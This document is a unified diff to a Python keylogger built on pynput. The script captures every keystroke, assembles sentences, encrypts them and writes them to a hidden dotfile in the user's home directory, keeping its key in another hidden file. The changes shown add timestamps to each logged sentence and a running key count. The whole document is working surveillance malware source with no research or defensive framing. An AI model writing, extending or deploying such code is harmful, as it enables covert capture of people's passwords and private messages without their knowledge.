@@ -2,8 +2,9 @@
 import os
 from pynput import keyboard
 from encryptor import encrypt_data, generate_key, save_key
+from datetime import datetime
 
-# Define paths
+# Paths
 HOME_DIR = os.path.expanduser('~')
 HIDDEN_FILE_PATH = os.path.join(HOME_DIR, '.my_secret_keystrokes')
 KEY_FILE_PATH = os.path.join(HOME_DIR, '.my_secret_key')
@@ -16,19 +17,22 @@ else:
     with open(KEY_FILE_PATH, 'rb') as f:
         key = f.read()
 
-# Clear hidden file every start
+# Clear log every system start
 with open(HIDDEN_FILE_PATH, 'wb') as f:
     pass
 
 current_sentence = ""
+total_keys = 0
 
 def save_sentence(sentence):
-    encrypted = encrypt_data(sentence, key)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    full_text = f"[{timestamp}] {sentence}"
+    encrypted = encrypt_data(full_text, key)
     with open(HIDDEN_FILE_PATH, 'ab') as f:
         f.write(encrypted + b'\n')
 
 def on_press(key):
-    global current_sentence
+    global current_sentence, total_keys
     try:
         k = key.char
     except AttributeError:
@@ -41,9 +45,10 @@ def on_press(key):
             save_sentence(current_sentence.strip())
         current_sentence = ""
     elif k.startswith('Key.'):
-        pass  # Ignore control keys
+        pass
     else:
         current_sentence += k
+    total_keys += 1
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
